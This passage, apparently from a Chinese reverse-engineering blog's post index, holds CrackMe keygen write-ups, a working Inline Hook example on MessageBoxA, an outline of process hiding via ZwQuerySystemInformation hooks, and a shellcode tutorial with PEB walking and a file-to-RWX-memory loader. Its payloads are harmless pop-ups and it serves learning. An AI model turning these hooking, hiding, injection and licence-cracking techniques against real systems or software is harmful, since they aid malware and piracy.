0; for (int i = 0; i &lt; len; i++) &#123; sum += szname[i] * num; &#125; int serial; serial = sum - 0x7A69; printf(&quot;%d\\n&quot;, serial); return serial;&#125;void CodiceChange(char* szname) &#123; int len = strlen(szname); int sum = len; int temp = 1; for (int i = 0; i &lt; len - 1; i++) &#123; sum = ((szname[i] * szname[i + 1]) * temp) + sum; temp++; &#125; int serial; serial = sum - 0x29A; printf(&quot;%d\\n&quot;, serial);&#125;void OkClick(int serial) &#123; char name[20]; itoa(serial, name,10); int len = strlen(name); int a = len; for (int i = 0; i &lt; len; i++) &#123; int temp = name[a-1] * name[a-1]; temp = temp * a; temp = temp % 0x19; temp = temp + 0x41; name[a - 1] = temp; a = a - 1; &#125; printf(&quot;%s\\n&quot;, name);&#125;int main() &#123; char name[20]; gets_s(name, 20); printf(&quot;让cancle消失，通过用户名求出的serial\\n&quot;); int serial = CancleClick(name); printf(&quot;-------------------------\\n&quot;); printf(&quot;仅仅只是显示OK按钮\\n&quot;); CodiceChange(name); printf(&quot;-------------------------\\n&quot;); printf(&quot;让OK消失，通过serial：%d\\n求出的用户名\\n&quot;,serial); OkClick(serial); return 0;&#125; cancle按钮 OK按钮 总结程序共有三个算法 nomechange和codicechange里的，仅仅只是让OK亮起来 cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起 OKClick里的，让OK按钮消失 不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"160CrackMe-004","slug":"160CrackMe-004","date":"2021-07-29T02:29:39.000Z","updated":"2021-08-09T10:53:54.343Z","comments":true,"path":"2021/07/29/160CrackMe-004/","link":"","permalink":"https://b1ackie.cn/2021/07/29/160CrackMe-004/","excerpt":"","text":"初探打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。 分析使用DIE查看一下，无壳，使用Delphi编写的。 使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。 下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。 此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。 那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。 根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。 下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。 大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方 看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码 而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。 1234500457D2C |. 8B45 E0 mov eax,dword ptr ss:[ebp-0x20] ; 输入的注册码00457D2F |. 8B93 18030000 mov edx,dword ptr ds:[ebx+0x318] ; 生成的00457D35 |. E8 52BFFAFF call CKme.00403C8C00457D3A |. 75 0A jnz short CKme.00457D4600457D3C |. C783 0C030000&gt;mov dword ptr ds:[ebx+0x30C],0x3E 这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。 12345600457C66 |. 8BB3 F8020000 mov esi,dword ptr ds:[ebx+0x2F8] ; 用户名长度00457C6C |. 83C6 05 add esi,0x5 ; 加上0x500457C6F |. FFB3 10030000 push dword ptr ds:[ebx+0x310]00457C75 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00457C78 |. 8BC6 mov eax,esi00457C7A |. E8 85FEFAFF call CKme.00407B04 ; 转字符串（10进制） 这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行） 但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。 然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。 什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。 那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。 注册机编写注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; printf(&quot;输入name：\\n&quot;); char name[20]; gets_s(name, 20); int len = strlen(name); len += 5; printf(&quot;注册码：\\n&quot;); printf(&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;, len, name);&#125;","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"HOOK-Inline Hook","slug":"HOOK-Inline Hook","date":"2021-07-28T03:17:15.000Z","updated":"2021-08-09T10:53:26.775Z","comments":true,"path":"2021/07/28/HOOK-Inline Hook/","link":"","permalink":"https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/","excerpt":"","text":"Inline HookInline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。 1MessageBoxA(NULL, &quot;这是本来的窗口&quot;, &quot;未被HOOK&quot;, MB_OK); 进入函数可以看到函数的具体 Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。 如何实现通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。 如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。 100401160 . /E9 EF000000 jmp InlineHo.00401254 JMP后的偏移计算公式是： 偏移=目的地址-原地址-5 5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。 想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。 具体实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;Windows.h&gt;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);FARPROC MessageBoxAAddress;BYTE NewData[5] = &#123; 0xE9, 0x0, 0x0, 0x0,0 &#125;;BYTE OldData[5] = &#123; 0 &#125;;void InlineHook();void UnInlineHook();int main() &#123; MessageBoxA(NULL, &quot;原始窗口1&quot;, &quot;未被HOOK&quot;, MB_OK); InlineHook(); MessageBoxA(NULL, &quot;原始窗口2&quot;, &quot;未被HOOK&quot;, MB_OK); UnInlineHook(); MessageBoxA(NULL, &quot;原始窗口3&quot;, &quot;未被HOOK&quot;, MB_OK); return 0;&#125;void InlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); //保存原数据 memcpy(OldData, MessageBoxAAddress, 5); //计算需要跳转的偏移 DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress - 5; //写入新数据，跳转的偏移 memcpy(&amp;NewData[1], &amp;dwOffset, 5); DWORD dwOldprotect = 0; //修改页属性 VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect); //写入五个字节 memcpy(MessageBoxAAddress, NewData, 5); //恢复页属性 VirtualProtect(MessageBoxAAddress, 5, dwOldprotect, &amp;dwOldprotect);&#125;void UnInlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); DWORD dwOldProtect = 0; VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //恢复原来的字节码 memcpy(MessageBoxAAddress, OldData, 5); VirtualProtect(MessageBoxAAddress, 5, dwOldProtect, &amp;dwOldProtect);&#125;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) &#123; //先恢复原来的字节码，然后调用正常的MessageboxA弹窗 UnInlineHook(); int bRet = MessageBoxA(NULL, &quot;Inline Hook\\ni am b1ackie!!!&quot;, &quot;hook&quot;, MB_OK); InlineHook(); return bRet;&#125; 可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。 先是第一个正常的窗口 然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了 第三个窗口再取消InlineHook后弹出正常的窗口 现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。 跳过来看，就是我们自己编写的My_MessageBoxA函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464700401170 &gt;/. 55 push ebp00401171 |. 8BEC mov ebp,esp00401173 |. 83EC 08 sub esp,0x800401176 |. A1 04304100 mov eax,dword ptr ds:[__security_cookie_fai&gt;0040117B |. 33C5 xor eax,ebp0040117D |. 8945 FC mov dword ptr ss:[ebp-0x4],eax00401180 |. 56 push esi00401181 |. 68 4C1C4100 push InlineHo.00411C4C ; /MessageBoxA00401186 |. 68 581C4100 push InlineHo.00411C58 ; |/user32.dll0040118B |. FF15 04D04000 call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibraryA&gt;&gt;; |\\LoadLibraryA00401191 |. 50 push eax ; |hModule = 0000000100401192 |. FF15 08D04000 call dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddres&gt;; \\GetProcAddress00401198 |. 8B35 00D04000 mov esi,dword ptr ds:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect0040119E |. 8D4D F8 lea ecx,dword ptr ss:[ebp-0x8]004011A1 |. 51 push ecx ; /pOldProtect = 049BE914004011A2 |. 6A 40 push 0x40 ; |NewProtect = PAGE_EXECUTE_READWRITE004011A4 |. 6A 05 push 0x5 ; |Size = 0x5004011A6 |. 50 push eax ; |Address = 00000001004011A7 |. A3 A0424100 mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |004011AC |. C745 F8 00000&gt;mov dword ptr ss:[ebp-0x8],0x0 ; |004011B3 |. FFD6 call esi ; \\VirtualProtect004011B5 |. 8B0D A0424100 mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;; user32.MessageBoxA004011BB |. A1 98424100 mov eax,dword ptr ds:[OldDatan_table]004011C0 |. 8901 mov dword ptr ds:[ecx],eax004011C2 |. A0 9C424100 mov al,byte ptr ds:[0x41429C]004011C7 |. 8841 04 mov byte ptr ds:[ecx+0x4],al004011CA |. 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]004011CD |. 50 push eax ; /pOldProtect = 00000001004011CE |. FF75 F8 push dword ptr ss:[ebp-0x8] ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|400400004011D1 |. 6A 05 push 0x5 ; |Size = 0x5004011D3 |. 51 push ecx ; |Address = 049BE914004011D4 |. FFD6 call esi ; \\VirtualProtect004011D6 |. 6A 00 push 0x0 ; /Style = MB_OK|MB_APPLMODAL004011D8 |. 68 641C4100 push InlineHo.00411C64 ; |hook004011DD |. 68 6C1C4100 push InlineHo.00411C6C ; |Inline Hook\\ni am b1ackie!!!004011E2 |. 6A 00 push 0x0 ; |hOwner = NULL004011E4 |. FF15 10D14000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;] ; \\MessageBoxA004011EA |. 8BF0 mov esi,eax004011EC |. E8 CFFEFFFF call InlineHo.InlineHook_ansi_nolocketaryso&gt;004011F1 |. 8B4D FC mov ecx,dword ptr ss:[ebp-0x4]004011F4 |. 8BC6 mov eax,esi004011F6 |. 33CD xor ecx,ebp004011F8 |. 5E pop esi ; InlineHo.0040103C004011F9 |. E8 06000000 call InlineHo.__security_check_cookiepresen&gt;004011FE |. 8BE5 mov esp,ebp00401200 |. 5D pop ebp ; InlineHo.0040103C00401201 \\. C2 1000 retn 0x10 注入方式实现inline hook我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。 远程线程的具体实现：注入技术-远程线程注入 编写一个弹窗，实现效果如下 当注入成功后，内容更改 总结本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。","categories":[{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ackie.cn/categories/HOOK%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ackie.cn/tags/Inline-Hook/"}]},{"title":"隐藏技术-进程隐藏","slug":"隐藏技术-进程隐藏","date":"2021-07-27T03:25:51.000Z","updated":"2021-08-09T10:52:38.617Z","comments":true,"path":"2021/07/27/隐藏技术-进程隐藏/","link":"","permalink":"https://b1ackie.cn/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/","excerpt":"","text":"进程隐藏在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。 实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。 可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数 在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。 这需要用到Inline Hook，关于Inline Hook看这里 HOOK-Inline Hook 函数介绍ZwQuerySystemInformation 获取指定的系统信息 123456NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength); SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。 SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。 SystemInformationLength：SystemInformation指向缓冲区的大小。 ReturnLength：指向函数写入请求信息的实际大小的位置。 返回值：返回NTSTATUS成功或错误代码。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"shellcode学习","slug":"shellcode学习","date":"2021-07-22T01:58:08.000Z","updated":"2021-08-09T10:53:47.394Z","comments":true,"path":"2021/07/22/shellcode学习/","link":"","permalink":"https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"shellcode学习编译器的一些设置第一步修改入口点在编译器中修改程序的入口点，写代码时就可以使用新的入口点名 修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。 第二步关闭缓冲区安全检查 然后查看IDA，左边函数只剩一个了 第三步设置工程兼容XP 修改运行库为MT 第四步关闭生成清单 使用loadpe查看看到只有两个区段 第五步关闭调试信息 shellcode编写原则1 杜绝双引号字符串的直接使用 关闭VS自动优化没有使用到的变量 自定义函数入口 #pragma comment(linker,”/entry:EntryMain”) shellcode编写原则2动态获取函数地址 12345678910111213141516#include &lt;Windows.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)int EntryMain() &#123; typedef int (WINAPI* FN_MessageBoxA)( __in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType); FN_MessageBoxA fn_MessageBoxA; fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); fn_MessageBoxA(NULL, &quot;b1ackie&quot;, &quot;hhh&quot;, NULL); return 0;&#125; shellcode编写原则3获取kernel32.dll基址和GetProcAddress地址获取。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)#pragma comment(lib, &quot;ucrtd.lib&quot;) //#pragma comment(lib, &quot;msvcrtd.lib&quot;) //#pragma comment(lib, &quot;vcruntimed.lib&quot;) _declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax,[eax+10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char *lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27;&amp;&amp; lpFuncName[1] == &#x27;e&#x27;&amp;&amp; lpFuncName[2] == &#x27;t&#x27;&amp;&amp; lpFuncName[3] == &#x27;P&#x27;&amp;&amp; lpFuncName[4] == &#x27;r&#x27;&amp;&amp; lpFuncName[5] == &#x27;o&#x27;&amp;&amp; lpFuncName[6] == &#x27;c&#x27;&amp;&amp; lpFuncName[7] == &#x27;A&#x27;&amp;&amp; lpFuncName[8] == &#x27;d&#x27;&amp;&amp; lpFuncName[9] == &#x27;d&#x27;&amp;&amp; lpFuncName[10] == &#x27;r&#x27;&amp;&amp; lpFuncName[11] == &#x27;e&#x27;&amp;&amp; lpFuncName[12] == &#x27;s&#x27;&amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc; //PWORD &#125;int EntryMain() &#123; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); return 0;&#125; shellcode编写原则4 避免全局变量的使用 确保已加载所使用的API的动态链接库 第一种shellcode生成框架通过上述操作直接编写，编写一个拥有弹窗功能的shellcode 具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;Windows.h&gt;DWORD getKernel32();FARPROC _GetProcAddress(HMODULE hModule);int EntryMain() &#123; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); typedef HMODULE(WINAPI* FN_LoadLibraryA)( _In_ LPCSTR lpLibFileName); char szLoadLibraryA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,0 &#125;; FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA); char szMessageBoxA[] = &#123; &#x27;M&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;s&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;B&#x27;, &#x27;o&#x27;, &#x27;x&#x27;, &#x27;A&#x27;, 0 &#125;; typedef int(WINAPI* FN_MessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); char szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,0 &#125;; FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA); char szHello[] = &#123; &#x27;b&#x27;,&#x27;1&#x27;,&#x27;a&#x27;,&#x27;c&#x27;,&#x27;k&#x27;,&#x27;i&#x27;,&#x27;e&#x27;,&#x27;!&#x27;,0 &#125;; char szTitle[] = &#123; &#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,0 &#125;; fn_MessageBoxA(NULL, szHello, szTitle, NULL); return 0;&#125;_declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax, [eax + 10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char* lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27; &amp;&amp; lpFuncName[1] == &#x27;e&#x27; &amp;&amp; lpFuncName[2] == &#x27;t&#x27; &amp;&amp; lpFuncName[3] == &#x27;P&#x27; &amp;&amp; lpFuncName[4] == &#x27;r&#x27; &amp;&amp; lpFuncName[5] == &#x27;o&#x27; &amp;&amp; lpFuncName[6] == &#x27;c&#x27; &amp;&amp; lpFuncName[7] == &#x27;A&#x27; &amp;&amp; lpFuncName[8] == &#x27;d&#x27; &amp;&amp; lpFuncName[9] == &#x27;d&#x27; &amp;&amp; lpFuncName[10] == &#x27;r&#x27; &amp;&amp; lpFuncName[11] == &#x27;e&#x27; &amp;&amp; lpFuncName[12] == &#x27;s&#x27; &amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc;&#125; 然后使用PEID查看偏移，可以看到是200, 然后使用十六进制编辑器将其中的机器码拷贝出来。 选取一个替代的程序，查看其偏移 然后进入编辑器，从偏移开始粘贴我们的机器码 然后打开这个程序就会实现shellcode编写的弹窗效果了 第二种shellcode生成框架单文件的函数生成位置规律单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。 如这样一个程序，定义的顺序是先A，后B 在IDA中可以看到顺序是先B后A。 多文件生成规律与包含的文件位置无关，与实际调用顺序有关。 在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。 修改一下顺序，编译顺序也会改变 实际编写在其中定义几个文件 0.entry.cpp：入口点 a.start.cpp：shellcode执行 z.end.cpp：shellcode结束 a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。 12345HANDLE hBin = CreateFileA(&quot;sh.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);DWORD dwSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;DWORD dwWrite;WriteFile(hBin, ShellcodeStart, dwSize, &amp;dwWrite, NULL);CloseHandle(hBin); shellcode加载器123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc,char* argv[])&#123; HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;open failed\\n&quot;); return -1; &#125; DWORD dwSize; dwSize = GetFileSize(hFile, NULL); LPVOID lpAddr = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpAddr == NULL) &#123; printf(&quot;virtual failed\\n&quot;); CloseHandle(hFile); return -1; &#125; DWORD dwRead; ReadFile(hFile, lpAddr, dwSize, &amp;dwRead, 0); __asm &#123; call lpAddr &#125; _flushall(); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ackie.cn/categories/ShellCode/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ackie.cn/tags/ShellCode/"}]},{"title":"160CrackMe-003","slug":"160CrackMe-003","date":"2021-07-21T07:11:38.000Z","updated":"2021-08-09T10:53:52.616Z","comments":true,"path":"2021/07/21/160CrackMe-003/","link":"","permalink":"https://b1ackie.cn/2021/07/21/160CrackMe-003/","excerpt":"","text":"初探打开程序看到需要输入用户名和序列号尝试输入后提示错误 分析使用工具查看，发现未加壳，语言是VB。 用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0] 1234567891011121314151617004081E3 . FF15 18B14000 call dword ptr 